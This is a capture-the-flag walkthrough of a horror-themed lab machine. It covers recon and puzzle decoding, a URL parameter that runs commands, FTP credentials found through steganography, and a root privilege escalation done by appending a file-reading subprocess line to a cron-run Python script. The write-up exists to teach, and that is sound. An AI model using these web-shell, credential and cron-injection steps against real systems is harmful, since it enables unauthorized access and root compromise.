
# Scanning and Enumaration

nmap scan:

```bash
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 ProFTPD 1.3.5a
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 44:2f:fb:3b:f3:95:c3:c6:df:31:d6:e0:9e:99:92:42 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDtgGI2Qpv+ora/iClEVeJSyw673ED4ciilMWv/Cw2NtVl9oB8A5rKktZYnJDw5sYZOvXimjb20Rk6a742anZZA87PM3StTZy8ZAMDEwdt8omaz5zy1c+HcJi4jjUIzPAZK10iKJ0JnyZ3eZZgEXALsU1zTi6U8Wn+6pixB9yRzAV8FVd/UThmC8vkiyNbNJUF6tgP+paajOIq2KzcmYrn8zZFL79EjDUUqSx72/wc/VUYyNArVGtVmOuvW1TBQwnpUv3zNQL1sabfiRzmgWB4unfHCVbj8autfHOfHSpMxC5QOuOJRTdhak6MUlHbjSXBF5MU1OP4mNTIoh/+e8k17
|   256 92:24:36:91:7a:db:62:d2:b9:bb:43:eb:58:9b:50:14 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCE8pJD7f5qX4X2kInnJf/m5wbTLOFA3I49Hyi2MrHxg3jREHseTbpqk00Xmy7F2+8Z8ljTdJwD9aafUAPgXxes=
|   256 34:04:df:13:54:21:8d:37:7f:f8:0a:65:93:47:75:d0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPxHqNM/ISBztZhs47D+flKJiTqFqt5kJrFDoeNyO8Zb
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome To Becon Mental Hospital
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.10
```

### Port 80

I found looking at the source code:

```html
<!-- Sebastian sees a path through the darkness which leads to a room => /sadistRoom -->
```

The key is:

```bash
532219a04ab7a02b56faafbec1a4c1ea
```

Looking at the js we can see that we need to type the key in a field
as fast as we can and we will go to the lockerRoom

We need to decode a key again to see the map

```bash
Tizmg_nv_zxxvhh_gl_gsv_nzk_kovzhv
```

Using cybershef -> atbash cipher

```bash
Grant_me_access_to_the_map_please
```

In the html of /SafeHeaven I found:

```html
<!-- I think I'm having a terrible nightmare. Search through me and find it ... -->
```

So I decided to do a gobuster, I failed cause I tried a small wordlist  
I got stuck but then just for the sakes of it I tried:

```bash
gobuster dir -u http://10.10.94.138/SafeHeaven/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

After a long time I found:

```bash
===============================================================
2020/10/15 22:32:09 Starting gobuster
===============================================================
/imgs (Status: 301)
/keeper (Status: 301)
```

navigating to /keeper presents another challenge.  
Looking through the source code gives us a hint

```html
<!-- To Find it Add Reverse To Google -->
```

We download the image  
Quickly search it on google (better use Yandex for other challenges), and..

```html
St. Augustine Lighthouse
```

We get a new key:

```ba
48ee41458eb0b43bf82b986cecf3af01
```

So now we navigate to the Abandoned Room to get further,
We enter the key and try to enumarate.  

We go further and again hiding in the source code we something about a shell

If we use ?shell as a parameter in the URL we can execute commands!!!  
Sweet

Saddly the commands were super limited and after a long time
I found the needed URL by doing `ls ..` and navigating to that dir

After that I download the helpme.zip file and continue to the next part

I extracted the files inside

Rename the Table.jpg Table.zip

Extract that

Then Decode the .wav to morse from
[this](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)
site

```txt
SHOWME
```

I use steghide with this password

```bash
steghide extract -sf Joseph_Oda.jpg
```

And I get ftp creds:

```bash
joseph:intotheterror445
```

I log in to the ftp server with this creds and download everything from there

I write a small bash script and I get

```bash
55 444 3 6 2 66 7777 7 2 7777 7777 9 666 777 3 444 7777 7777 666 7777 8 777 2 66 4 33
```

This is SMS Phone Tap Cipher so:

```ba
KIDMANSPASSWORDISSOSTRANGE
```

# Exploitation

ssh in with

```bash
ssh kidman@10.10.94.138sh kidman@10.10.94.138
```

# Post Exploitation

Doing a basic enumaration in the machine I found a crontab running as root

```bash
root python3 /var/.the_eye_of_ruvik.py
```

# Privilege Escalation

```bash
echo 'subprocess.call("cat /root/root.txt > /home/kidman/.the_eye.txt",shell=True)' >> /var/.the_eye_of_ruvik.py
```
